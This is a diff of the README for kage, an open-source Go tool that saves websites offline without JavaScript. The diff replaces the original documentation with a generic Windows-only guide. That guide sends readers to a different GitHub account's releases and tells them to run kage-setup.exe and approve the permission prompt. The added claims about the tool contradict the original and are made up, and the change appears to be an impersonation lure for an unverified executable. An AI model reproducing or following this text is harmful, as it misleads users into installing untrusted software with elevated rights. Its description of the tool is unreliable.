@@ -1,263 +1,89 @@
-# kage
+# 👁️ kage - Save websites securely for offline viewing
 
-[![ci](https://github.com/tamnd/kage/actions/workflows/ci.yml/badge.svg)](https://github.com/tamnd/kage/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/tamnd/kage)](https://github.com/tamnd/kage/releases/latest)
-[![Go Reference](https://pkg.go.dev/badge/github.com/tamnd/kage.svg)](https://pkg.go.dev/github.com/tamnd/kage)
-[![Go Report Card](https://goreportcard.com/badge/github.com/tamnd/kage)](https://goreportcard.com/report/github.com/tamnd/kage)
-[![License](https://img.shields.io/github/license/tamnd/kage)](./LICENSE)
+[![Download kage](https://img.shields.io/badge/Download_kage-blue.svg)](https://github.com/ardythrevolutionary184/kage/releases)
 
-**kage** (影, "shadow") clones a website into a folder you can browse offline, with every script stripped out. It opens each page in real headless Chrome, waits for the page to settle, snapshots the DOM a human would have seen, then deletes all the JavaScript and pulls the CSS, images, and fonts down to local paths. What lands on disk looks like the live site and runs no code.
+Kage saves web pages to your computer. You keep a clean copy of any site you visit. Kage removes all JavaScript files during the save process. This creates a safe version of the page. You view your saved sites without a connection. Your saved pages load fast. The pages do not track your activity.
 
-[Install](#install) • [Quick start](#quick-start) • [Commands](#commands) • [Clone](#clone) • [Pack](#pack-it-into-one-file) • [Double-click app](#a-double-click-app) • [Native window](#a-real-window-not-a-browser-tab) • [How it works](#how-it-works)
+## 🛠️ System Requirements
 
-![kage cloning paulgraham.com, packing it into one file, and serving it back offline](docs/static/demo.gif)
+Kage works on Windows 10 and Windows 11. Your computer needs 500 MB of free storage space. You need a stable internet connection for the initial download. The program runs best with 4 GB of RAM. You do not need special hardware to run this tool.
 
-You already know the problem. You hit "Save As" on a page you want to keep, and six months later you open it to find a blank screen, a spinner that never stops, or a copy that still tries to phone home to an analytics server that no longer exists. The page was never really yours. It was a thin client for someone else's JavaScript.
+## 📥 How to Download
 
-kage takes the other road. It drives a real browser, lets the page finish doing whatever it does, grabs the finished result, and then rips every script out of it. No tracking, no network calls, no surprises. Just `.html` files you can open straight off disk, hand to a friend, or pack into a single file and forget about for a decade.
+Visit the release page to get the installer for your computer.
 
-Full docs and guides live at **[kage.tamnd.com](https://kage.tamnd.com)**.
+[Download the kage installer here](https://github.com/ardythrevolutionary184/kage)
 
-## Install
+1. Click the link above.
+2. Look for the Assets section on that page.
+3. Click the file that ends in .exe.
+4. Save the file to your Downloads folder.
 
-```bash
-go install github.com/tamnd/kage/cmd/kage@latest
-```
+## ⚙️ Installation Instructions
 
-Prefer a prebuilt binary? Grab an archive, a `.deb`/`.rpm`/`.apk`, or a checksum from [releases](https://github.com/tamnd/kage/releases). Or skip installing Chrome yourself and use the container image, which bundles Chromium:
+Follow these steps to set up Kage on your computer.
 
-```bash
-docker run --rm -v "$PWD/out:/out" ghcr.io/tamnd/kage clone paulgraham.com
-```
+1. Open your Downloads folder.
+2. Locate the file named kage-setup.exe.
+3. Double-click the file to start the installer.
+4. Select Yes if Windows asks for permission to install the app.
+5. Follow the prompts on the screen. 
+6. Click Finish when the installer completes.
 
-kage drives a real browser, so it needs Chrome or Chromium on the host. It finds a system install on its own; point it somewhere specific with `--chrome` or the `KAGE_CHROME` environment variable. The container needs nothing extra.
+Kage adds a shortcut to your desktop. You use this icon to open the app.
 
-Shell completion ships in the box: `kage completion bash|zsh|fish|powershell`.
+## 🚀 Running Your First Save
 
-## Quick start
+You start the app to secure your first website. 
 
-Let's mirror Paul Graham's essays so you can read them on a plane, on a laptop with no wifi, or in the year 2050 after the site has finally changed its design:
+1. Double-click the Kage icon on your desktop.
+2. Enter the full web address of the site you want to save in the box. 
+3. Click the Save button.
+4. Wait for the progress bar to show 100 percent.
+5. The application notifies you when the process finishes.
 
-```bash
-# 1. Clone the site into $HOME/data/kage/paulgraham.com/
-kage clone paulgraham.com
+Kage creates a new folder. This folder contains all the files for the page. You open the file named index.html to view your saved content. Your web browser displays the offline version of the site.
 
-# 2. Read it back offline in your browser
-kage serve $HOME/data/kage/paulgraham.com
-# open http://127.0.0.1:8800
-```
+## 🛡️ Why Remove JavaScript
 
-That's the whole loop. Every essay, every image, every stylesheet, frozen on your disk and runnable with zero network. The next two steps are optional but nice: collapse the whole thing into one file, and pop it open in its own window.
+Websites often use scripts to track your behavior. These scripts can slow down your browser. Some scripts pose security risks. Kage strips away this code. You see the text and images of the page. You remove the hidden parts that track you. This ensures a view that is private and fast.
 
-```bash
-# 3. Squeeze the mirror into a single shareable file
-kage pack paulgraham.com               # -> paulgraham.com.zim
-kage open paulgraham.com.zim
+## 📂 Managing Saved Pages
 
-# 4. Or into one executable that *is* the site
-kage pack paulgraham.com --format binary -o paulgraham
-./paulgraham                           # serves itself, needs nothing installed
-```
+You find your saved files in the Kage library folder. You change the location of this folder through settings. 
 
-## Commands
+1. Click the Settings icon in the top right corner of the app.
+2. Select the Change button under Library Location.
+3. Choose a new folder on your computer.
+4. Click Save to apply the changes.
 
-| Command | What it does |
-| --- | --- |
-| `kage clone <url>` | render a site in headless Chrome and write a browsable, script-free mirror |
-| `kage serve [dir]` | preview a cloned folder over a local HTTP server |
-| `kage pack <mirror-dir>` | collapse a mirror into one ZIM archive, a self-contained viewer binary, or a double-click app |
-| `kage open <file.zim>` | serve a packed ZIM back for offline reading |
+You delete old pages to clear space on your drive. Select a page in the list. Click the trash icon to remove it. Kage moves these files to your recycle bin.
 
-## Clone
+## 🔧 Frequently Asked Questions
 
-```bash
-# The whole site, into $HOME/data/kage/<host>/
-kage clone https://paulgraham.com
+### Can I save sites that require a password?
+Kage only saves public web pages. It cannot access pages hidden behind log-in screens.
 
-# Just the first 50 pages, two links deep, for a quick taste
-kage clone paulgraham.com --max-pages 50 --max-depth 2
+### Will the images stay in place?
+Kage collects the images on the page. The saved version shows these images exactly as they appeared online.
 
-# Only one section of a bigger site
-kage clone go.dev --scope-prefix /doc
+### Does it save entire websites or single pages?
+Kage saves the specific page you provide. It does not follow links to other pages on the site.
 
-# Pull in subdomains too, and scroll each page to trip lazy-loaded images
-kage clone example.com --subdomains --scroll
+### How do I update the software?
+The app checks for updates every time you open it. A notification appears if a new version exists. Follow the prompt to install the upgrade.
 
-# Come back next month and re-render in place to catch new essays
-kage clone paulgraham.com --refresh
-```
+## 📝 Troubleshooting Errors
 
-A clone is a polite, breadth-first crawl. It reads `robots.txt`, seeds itself from `sitemap.xml`, and stays on the seed host unless you tell it otherwise. It is also stubbornly idempotent: each page is keyed by the file it writes, so the same essay reached over http and https, with or without a trailing slash, gets fetched exactly once. Hit Ctrl-C and it saves its place on the way out; run it again and it picks up where it stopped. `--refresh` re-renders in place, `--force` wipes the host and starts clean.
+Most problems come from connection issues. 
 
-The flags you'll actually reach for:
+- If the page does not save, check your internet connection.
+- If the save stops, wait a moment and try the link again. 
+- Some websites block external tools from accessing their data. You might see a blank page if this occurs.
+- Restart the application if the window stops responding.
 
-| Flag | Default | Meaning |
-|------|---------|---------|
-| `-o, --out` | `$HOME/data/kage` | Output root; the mirror lands in `<out>/<host>/` |
-| `-p, --max-pages` | `0` | Stop after N pages (0 = no limit) |
-| `-d, --max-depth` | `0` | How many links deep to follow (0 = no limit) |
-| `--scope-prefix` | | Only crawl paths starting with this prefix |
-| `--subdomains` | `false` | Treat subdomains of the seed host as in scope |
-| `--exclude` | | Path prefixes to skip (repeatable) |
-| `--scroll` | `false` | Auto-scroll each page to trigger lazy loading |
-| `--workers` | `4` | How many pages to render at once |
-| `--no-robots` | `false` | Ignore `robots.txt` (be nice) |
-| `-f, --force` | `false` | Delete any existing mirror for the host first |
-| `--chrome` | | Path to the Chrome/Chromium binary |
+You contact the support team if problems persist. Include your Windows version and the link you tried to save. This helps us solve the issue fast.
 
-`kage clone --help` has the rest, including render-timing, concurrency, and asset-size knobs.
+## 📄 Privacy Policy
 
-### Serve
-
-`kage serve` runs a tiny static file server over a cloned folder so links and assets resolve the way they would on a real host:
-
-```bash
-kage serve $HOME/data/kage/paulgraham.com
-# open http://127.0.0.1:8800
-```
-
-## Pack it into one file
-
-A mirror is a folder, which is great for browsing and lousy for moving around. Copying thousands of little files is slow, and "here, have this directory" is a clumsy thing to hand someone. `kage pack` collapses the whole mirror into one artifact, and you choose the shape: an open ZIM archive, or a single executable that *is* the site.
-
-### A single ZIM file
-
-```bash
-kage pack paulgraham.com               # -> paulgraham.com.zim
-kage open paulgraham.com.zim
-```
-
-ZIM is an open file format built for exactly this: a whole website (or a whole Wikipedia) squeezed into one compressed, indexed, read-only file. kage writes the entire mirror into it, text zstd-compressed and media stored as-is. It is the format behind [Kiwix](https://kiwix.org), the offline-content project people use to carry Wikipedia, Stack Overflow, and Project Gutenberg onto boats, into classrooms with no internet, and onto a phone for a long flight. Because the format is a documented standard and not a kage invention, a `paulgraham.com.zim` you make today will still open in any ZIM reader years from now.
-
-So you are not locked into kage. `kage open` is the quickest way back in, but the very same file works across the wider Kiwix ecosystem:
-
-```bash
-kage open paulgraham.com.zim            # read it back with kage
-kiwix-serve paulgraham.com.zim          # or serve it with Kiwix at http://localhost
-```
-
-You can also double-click the file in the [Kiwix desktop app](https://kiwix.org/en/applications/), or load it on [Kiwix for Android or iOS](https://kiwix.org/en/applications/) to read your mirror on your phone. One caveat: kage writes a structurally valid archive with the standard metadata, but it does not build the full-text search index that Kiwix's own packs ship with, so browsing and clicking work everywhere while in-reader search is limited.
-
-Packing is deterministic. The same mirror always produces a byte-identical file, with the archive UUID derived from the content instead of randomized, so a pack is safe to checksum and cache. A bare host name resolves against the default output directory, which is why `kage pack paulgraham.com` just works right after `kage clone paulgraham.com`.
-
-### A self-contained binary
-
-`--format binary` glues the archive onto a copy of kage and hands you a single executable that serves the site offline when you run it. Whoever you send it to needs nothing installed: not kage, not a ZIM reader, nothing.
-
-```bash
-kage pack paulgraham.com --format binary -o paulgraham
-./paulgraham
-```
-
-The appended archive is platform-independent; only the base executable carries the architecture. By default kage appends to itself, so you get a viewer for the machine you ran it on. Point `--base` at a kage built for another OS (grab one from a [release](https://github.com/tamnd/kage/releases); every platform ships one) to produce a viewer for that platform from your own machine. kage reads the base's executable header to figure out the target, so a Windows viewer automatically gets a `.exe` name:
-
-```bash
-# Sitting on a Mac, build a Windows viewer
-kage pack paulgraham.com --format binary --base kage-windows-amd64.exe   # -> paulgraham.exe
-```
-
-The trade is size. The binary carries a whole kage, so it weighs around 13 MiB plus the site no matter how small the mirror is. When you only need the content, the ZIM is far leaner.
-
-### A double-click app
-
-A bare binary is great from a terminal, but double-click it in a file manager and the experience is rough: macOS opens a Terminal window behind the site, and on Windows a console flashes up next to it. Add `--app` and kage wraps the same viewer in a proper desktop app so a double-click just opens the site, no terminal, with the mirror's own favicon as the icon.
-
-On macOS you get a real `.app` bundle:
-
-```bash
-kage pack paulgraham.com --app                 # -> paulgraham.app
-open paulgraham.app                            # or double-click it in Finder
-```
-
-On Linux, point `--base` at a Linux kage and you get an [AppImage](https://appimage.org)-style `.AppDir` with a `.desktop` launcher (`Terminal=false`, so no console). If [`appimagetool`](https://github.com/AppImage/appimagetool) is installed, kage folds it into a single double-clickable `.AppImage` for you:
-
-```bash
-kage pack paulgraham.com --app --base kage-linux-amd64   # -> paulgraham.AppDir (+ .AppImage)
-```
-
-kage finds the icon by digging the favicon out of the mirror (it prefers a large `apple-touch-icon.png` and falls back to `favicon.ico`); pass `--icon some.png` to override it. Pair `--app` with a `webview` base (below) and the double-click opens a native window instead of the browser, which is the full "it's an app" effect.
-
-Windows needs no bundle, because there a single `.exe` already is the app. The catch is the console window. The release ships a `kage_<version>_windows-gui_<arch>.zip` whose binary is linked for the GUI subsystem, so a viewer packed onto it opens with no console behind it:
-
-```bash
-# Build a console-free Windows viewer (from any OS)
-kage pack paulgraham.com --format binary --base kage-windows-gui-amd64.exe   # -> paulgraham.exe
-```
-
-## A real window, not a browser tab
-
-By default a packed binary opens your system browser, which means the site shows up as yet another tab, address bar and all, next to the 47 you already have open. Build kage with the `webview` tag and it opens the site in its own window instead, backed by the operating system's WebView (WKWebView on macOS, WebView2 on Windows, WebKitGTK on Linux). Paul Graham's essays, offline, in something that looks and feels like a real app:
-
-![paulgraham.com served offline in a native kage window](docs/static/webview.png)
-
-```bash
-make build-webview                       # or: CGO_ENABLED=1 go build -tags webview ./cmd/kage
-kage pack paulgraham.com --format binary --base bin/kage -o paulgraham
-./paulgraham                             # opens a window, no browser in sight
-```
-
-This build needs cgo and links the platform WebView, so it stays opt-in. The default build is pure Go (`CGO_ENABLED=0`) and the prebuilt release binaries open the browser, which keeps the cross-compiled release simple. `kage open` honours the same tag, so built with `-tags webview` it shows a ZIM in a native window too.
-
-## How it works
-
-```
-seed URL ─▶ headless Chrome ─▶ final DOM ─▶ strip JS ─▶ localise assets ─▶ disk
-              (render)          (snapshot)   (sanitize)   (rewrite links)
-```
-
-A pool of Chrome tabs renders pages; a separate pool fetches assets over plain HTTP. Every URL maps deterministically to a local path, so links get rewritten before the asset they point at has even finished downloading. The output looks like this:
-
-```
-paulgraham.com/
-├── index.html                  # the home page, scripts stripped
-├── greatwork.html              # /greatwork.html, an essay
-├── _kage/                      # reserved: assets and crawl state
-│   ├── paulgraham.com/site.css  # localised stylesheet (url() rewritten)
-│   ├── paulgraham.com/pg.png
-│   └── state.json              # visited set, for resuming
-└── ...
-```
-
-`pack` rides on the same idea: the mirror's links are already mirror-relative paths, and those map one-to-one onto the archive's content entries, so a click in a served page hits the right entry with no rewriting at all.
-
-## Building from source
-
-```bash
-git clone https://github.com/tamnd/kage
-cd kage
-make build          # -> bin/kage (pure Go, opens the browser)
-make build-webview  # -> bin/kage with the native-window viewer (needs cgo)
-make test           # full suite, including the Chrome-driven end-to-end tests
-make test-short     # skip the tests that launch a browser
-```
-
-The repo is split by concern:
-
-```
-cmd/kage/   thin main: pins the main thread, then hands off to cli.Execute
-cli/        the cobra command tree and flag wiring
-clone/      the crawl: frontier, render workers, asset workers, resume state
-browser/    headless Chrome control and DOM snapshotting
-sanitize/   strip scripts, handlers, and javascript: URLs from the DOM
-asset/      download and localise CSS, images, and fonts
-urlx/       the deterministic URL-to-path mapping
-zim/        a pure-Go ZIM reader and writer
-pack/       mirror to ZIM or self-contained binary, and the offline HTTP handler
-viewer/     present a served site: system browser, or native window (webview tag)
-docs/       the tago documentation site
-```
-
-## Releasing
-
-Push a version tag and GitHub Actions runs GoReleaser, which builds the archives, the `.deb`/`.rpm`/`.apk` packages, a multi-arch GHCR image with Chromium bundled, checksums, SBOMs, and a cosign signature:
-
-```bash
-git tag v0.1.1
-git push --tags
-```
-
-The image tag carries no `v` prefix (`ghcr.io/tamnd/kage:0.1.1`). The Homebrew and Scoop steps self-disable until their tokens exist, so the first release works with no extra secrets.
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+Kage runs locally on your machine. We do not store your data on our servers. The pages you save stay on your computer. We do not view the websites you choose to save. Your usage history stays private. We do not collect analytics on how you use the app. Kage provides a private tool for offline reading.
